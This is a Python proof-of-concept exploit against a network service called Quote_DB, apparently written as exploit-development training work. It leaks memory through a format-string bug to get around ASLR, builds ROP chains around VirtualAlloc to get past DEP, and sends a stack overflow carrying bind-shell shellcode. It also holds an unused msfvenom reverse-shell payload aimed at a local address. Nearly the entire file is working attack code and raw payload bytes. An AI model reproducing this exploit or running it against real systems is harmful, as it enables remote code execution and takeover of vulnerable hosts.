#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500

# ===

# bind shell

shellcode =  b"\x90" * 20
shellcode += b"\xb8\x3b\xcc\xbe\xaa\xdb\xd2\xd9\x74\x24\xf4\x5b\x33"
shellcode += b"\xc9\xb1\x53\x31\x43\x12\x83\xc3\x04\x03\x78\xc2\x5c"
shellcode += b"\x5f\x82\x32\x22\xa0\x7a\xc3\x43\x28\x9f\xf2\x43\x4e"
shellcode += b"\xd4\xa5\x73\x04\xb8\x49\xff\x48\x28\xd9\x8d\x44\x5f"
shellcode += b"\x6a\x3b\xb3\x6e\x6b\x10\x87\xf1\xef\x6b\xd4\xd1\xce"
shellcode += b"\xa3\x29\x10\x16\xd9\xc0\x40\xcf\x95\x77\x74\x64\xe3"
shellcode += b"\x4b\xff\x36\xe5\xcb\x1c\x8e\x04\xfd\xb3\x84\x5e\xdd"
shellcode += b"\x32\x48\xeb\x54\x2c\x8d\xd6\x2f\xc7\x65\xac\xb1\x01"
shellcode += b"\xb4\x4d\x1d\x6c\x78\xbc\x5f\xa9\xbf\x5f\x2a\xc3\xc3"
shellcode += b"\xe2\x2d\x10\xb9\x38\xbb\x82\x19\xca\x1b\x6e\x9b\x1f"
shellcode += b"\xfd\xe5\x97\xd4\x89\xa1\xbb\xeb\x5e\xda\xc0\x60\x61"
shellcode += b"\x0c\x41\x32\x46\x88\x09\xe0\xe7\x89\xf7\x47\x17\xc9"
shellcode += b"\x57\x37\xbd\x82\x7a\x2c\xcc\xc9\x12\x81\xfd\xf1\xe2"
shellcode += b"\x8d\x76\x82\xd0\x12\x2d\x0c\x59\xda\xeb\xcb\x9e\xf1"
shellcode += b"\x4c\x43\x61\xfa\xac\x4a\xa6\xae\xfc\xe4\x0f\xcf\x96"
shellcode += b"\xf4\xb0\x1a\x02\xfc\x17\xf5\x31\x01\xe7\xa5\xf5\xa9"
shellcode += b"\x80\xaf\xf9\x96\xb1\xcf\xd3\xbf\x5a\x32\xdc\xae\xc6"
shellcode += b"\xbb\x3a\xba\xe6\xed\x95\x52\xc5\xc9\x2d\xc5\x36\x38"
shellcode += b"\x06\x61\x7e\x2a\x91\x8e\x7f\x78\xb5\x18\xf4\x6f\x01"
shellcode += b"\x39\x0b\xba\x21\x2e\x9c\x30\xa0\x1d\x3c\x44\xe9\xf5"
shellcode += b"\xdd\xd7\x76\x05\xab\xcb\x20\x52\xfc\x3a\x39\x36\x10"
shellcode += b"\x64\x93\x24\xe9\xf0\xdc\xec\x36\xc1\xe3\xed\xbb\x7d"
shellcode += b"\xc0\xfd\x05\x7d\x4c\xa9\xd9\x28\x1a\x07\x9c\x82\xec"
shellcode += b"\xf1\x76\x78\xa7\x95\x0f\xb2\x78\xe3\x0f\x9f\x0e\x0b"
shellcode += b"\xa1\x76\x57\x34\x0e\x1f\x5f\x4d\x72\xbf\xa0\x84\x36"
shellcode += b"\xcf\xea\x84\x1f\x58\xb3\x5d\x22\x05\x44\x88\x61\x30"
shellcode += b"\xc7\x38\x1a\xc7\xd7\x49\x1f\x83\x5f\xa2\x6d\x9c\x35"
shellcode += b"\xc4\xc2\x9d\x1f"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.110 LPORT=443 EXITFUNC=thread -f python -v shell
shell =  b"\x90" * 20
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shell += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shell += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
shell += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
shell += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
shell += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
shell += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
shell += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
shell += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
shell += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shell += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shell += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
shell += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
shell += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shell += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
shell += b"\x01\x6e\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
shell += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shell += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
shell += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
shell += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
shell += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shell += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
shell += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
shell += b"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
shell += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# ===
# Register setup for VirtualAlloc() :
#--------------------------------------------
# EAX = NOP (0x90909090)
# ECX = flProtect (0x40)
# EDX = flAllocationType (0x1000)
# EBX = dwSize
# ESP = lpAddress (automatic)
# EBP = ReturnTo (ptr to jmp esp)
# ESI = ptr to VirtualAlloc()
# EDI = ROP NOP (RETN)
# --- alternative chain ---
# EAX = ptr to &VirtualAlloc()
# ECX = flProtect (0x40)
# EDX = flAllocationType (0x1000)
# EBX = dwSize
# ESP = lpAddress (automatic)
# EBP = POP (skip 4 bytes)
# ESI = ptr to JMP [EAX]
# EDI = ROP NOP (RETN)


# alternative chain
rop_gadgets = [

        # pop eax ; pop ecx
        base + 0x3047,
        0x771c1640, # EAX = ptr to &VirtualAlloc(). Base + IAT + VirtualAlloc() Offset
        0x00000040, # ECX = flProtect (0x40)

        # pop edx
        base + 0x1fde,
        0x00001000, # EDX = flAllocationType (0x1000)

        # pop ebx
        0x74d564b8,
        0x00000001, # EBX = dwSize

        # pop ebp
        0x7738a5bf,
        0x771214cd, # & call esp [KERNELBASE.dll] ** REBASED ** ASLR

        # pop esi
        0x750b6427,
        base + 0x19a7, # ESI = ptr to JMP [EAX]

        # pop edi
        0x76f7614c,
        base + 0x109d, # EDI = ROP NOP (RETN)

        #pushad     # Push all registers onto the stack
        0x753d17ad
]

rop_gadgets = b"".join([pack('<I', _) for _ in rop_gadgets])


# 1. ESP to EAX
# 2. Dummy Call Address into EBX
# 3. Deref VirtualAlloc() into EAX
# 4. VirtualAlloc() to EBX
#    (EAX) to EBX
# 5. Shellcode Address into EAX
# 6. Get skeleton call addr + 0x4 (in ebx)
# 7. Write shellcode addr to skeleton + 0x4
# 8. Get skeleton call addr + 0x8 (in ebx)
# 9. Write shellcode addr to skeleton + 0x8
# 10. Align esp with skeleton call (ebx-8)

rop = [
# 1. Get ESP (in eax)
    #base + 0x25c0, # xor eax, eax ; ret
    #base + 0x1s69, # or eax, esp ; ret

# 2. Get skeleton call addr (in ebx)
    base + 0x2b38, # pop ecx ; ret
    0x1ec, # eax + ? = skeleton call
    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
    0xffffffff, # junk for pop ebx
    base + 0x1e73, # mov ebx, eax ; ret

# 3. Deref virtualAlloc (in eax)
    base + 0x2b37, # pop eax ; pop ecx ; ret
    #base + 0x43218, # base + iat + virtualalloc
    0x77841640,
    0xffffffff, # junk for pop ecx
    base + 0x1e6c, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
    0xffffffff, # junk for pop edx

# 4. Write virtual alloc to skeleton
    base + 0x1e7a, # mov [ebx], eax ; ret

# 5. Get shellcode addr (in eax)
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x2cec, # mov eax, edx ; ret
    base + 0x2b38, # pop ecx ; ret
    0x18,          # eax + ? = skeleton call
    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
    0xffffffff, # junk for pop ebx
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret

# 6. Get skeleton call addr + 0x4 (in ebx)
    base + 0x1e82, # add ebx, 0x4 ; ret

# 7. Write shellcode addr to skeleton + 0x4
    base + 0x1e7a, # mov [ebx], eax ; ret

# 8. Get skeleton call addr + 0x8 (in ebx)
    base + 0x1e82, # add ebx, 0x4 ; ret

# 9. Write shellcode addr to skeleton + 0x8
    base + 0x1e7a, # mov [ebx], eax ; ret

# 10. Align esp with skeleton call (ebx-8)
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x2b38, # pop ecx ; ret
    0xfffffff8, # edx + ? = skeleton call
    base + 0x1e86, # add edx, ecx ; ret
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x1e76, # xchg ebx, esp ; dec ecx ; ret
]
rop = b"".join([pack("<I", r) for r in rop])

# ===

skeleton  = b"aaaa" # VirtualAlloc
skeleton += b"bbbb" # return <- shellcode addr
skeleton += b"cccc" # lpAddress <- shellcode addr
skeleton += pack("<I", 0x1) # dwSize <- 0x1
skeleton += pack("<I", 0x1000) # flAllocationType <- 0x1000
skeleton += pack("<I", 0x40) # flProtect <- 0x40

# ===

buf  = b"A" * 2060
buf += rop # ROP
buf += skeleton
buf += shellcode
buf += b"C" * ropSize

# Next Steps
'''
0. Bypass DEP
1. ROP w/ PUSAD - OK
2. How to locate base address with IAT & leaks
2. ROP w/ skeleton & offsets
4. Bypass ASLR
'''

# ===

print("[+] Triggering overflow...")

bad_request(buf)
